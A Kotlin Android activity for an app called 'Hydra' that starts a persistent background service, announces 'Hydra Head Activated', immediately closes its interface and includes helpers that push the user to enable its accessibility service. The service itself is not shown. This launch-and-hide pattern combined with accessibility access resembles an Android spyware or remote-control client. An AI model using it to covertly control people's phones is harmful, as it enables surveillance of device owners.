package com.hydra.client

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Build
import android.util.Log
import android.widget.Toast
import android.provider.Settings
import android.text.TextUtils

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val intent = Intent(this, HydraService::class.java)

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // This tells Android: "I promise to call startForeground() within 5 seconds"
                startForegroundService(intent)
            } else {
                startService(intent)
            }
            Toast.makeText(this, "Hydra Head Activated", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Log.e("Hydra", "Failed to start service: ${e.message}")
        }
        
        // Close the UI
        finish()
    }

    fun isAccessibilityServiceEnabled(context: Context, service: Class<*>): Boolean {
        val expectedId = context.packageName + "/" + service.canonicalName
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        if (enabledServices == null) return false
        
        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)
        
        while (colonSplitter.hasNext()) {
            val componentName = colonSplitter.next()
            if (componentName.equals(expectedId, ignoreCase = true)) {
                return true
            }
        }
        return false
    }

    fun promptEnableAccessibility(context: Context) {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        context.startActivity(intent)
    }
}